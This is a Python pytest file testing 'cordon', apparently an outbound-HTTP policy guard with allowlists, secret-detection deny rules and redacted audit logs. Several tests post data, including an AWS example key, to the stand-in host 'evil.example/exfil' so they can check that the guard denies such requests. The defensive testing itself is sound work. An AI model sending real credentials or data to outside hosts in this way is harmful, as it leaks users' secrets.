import json

import pytest

import cordon
from cordon import CordonDenied

requests = pytest.importorskip("requests")
responses = pytest.importorskip("responses")


POLICY = {
    "version": 1,
    "default": "allow",
    "rules": [
        {
            "id": "block-secret-exfil",
            "when": {
                "vendor": "http",
                "body_matches": "AKIA[0-9A-Z]{16}",
            },
            "action": "deny",
            "reason": "outbound body contains an AWS access key",
        },
        {
            "id": "block-unknown-host",
            "when": {
                "vendor": "http",
                "host_not_in": ["api.github.com", "*.amazonaws.com"],
            },
            "action": "deny",
            "reason": "host not in allowlist",
        },
    ],
}


@pytest.fixture(autouse=True)
def _clean():
    yield
    cordon.uninstall()


@responses.activate
def test_allowed_request_passes_through(tmp_path):
    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
    responses.add(
        responses.GET,
        "https://api.github.com/repos/a/b",
        json={"ok": True},
        status=200,
    )
    r = requests.get("https://api.github.com/repos/a/b")
    assert r.status_code == 200
    entry = json.loads((tmp_path / "a.jsonl").read_text().strip())
    assert entry["vendor"] == "http"
    assert entry["decision"] == "allow"


def test_secret_in_body_denied(tmp_path):
    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
    with pytest.raises(CordonDenied) as exc:
        requests.post(
            "https://api.github.com/leak",
            json={"creds": "AKIAIOSFODNN7EXAMPLE"},
        )
    assert exc.value.vendor == "http"
    assert exc.value.rule_id == "block-secret-exfil"
    # Audit must be redacted.
    entry = json.loads((tmp_path / "a.jsonl").read_text().strip())
    assert "AKIA" not in json.dumps(entry)


def test_unknown_host_denied(tmp_path):
    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
    with pytest.raises(CordonDenied) as exc:
        requests.post("https://evil.example/exfil", json={"x": 1})
    assert exc.value.rule_id == "block-unknown-host"


@responses.activate
def test_requests_shim_skipped_for_pygithub_calls(tmp_path):
    """When github_shim has already governed a call, the requests catch-all
    must NOT double-evaluate. This is what the vendor_scope reentrancy guard
    is for."""
    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
    responses.add(
        responses.GET,
        "https://api.github.com:443/repos/a/b",
        json={"ok": True},
        status=200,
    )
    from github.Auth import Token
    from github.Requester import Requester

    req = Requester(
        auth=Token("fake"),
        base_url="https://api.github.com",
        timeout=15,
        user_agent="test",
        per_page=30,
        verify=True,
        retry=None,
        pool_size=None,
        seconds_between_requests=0,
        seconds_between_writes=0,
    )
    req.requestJsonAndCheck("GET", "/repos/a/b")
    # Exactly one audit line: the github_shim's, not the requests catch-all's.
    lines = (tmp_path / "a.jsonl").read_text().strip().splitlines()
    assert len(lines) == 1
    entry = json.loads(lines[0])
    assert entry["vendor"] == "github"


@responses.activate
def test_uninstall_removes_patch(tmp_path):
    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
    cordon.uninstall()
    responses.add(
        responses.POST,
        "https://evil.example/exfil",
        json={"ok": True},
        status=200,
    )
    # After uninstall, even unknown-host POST should pass through.
    requests.post("https://evil.example/exfil", json={"x": 1})
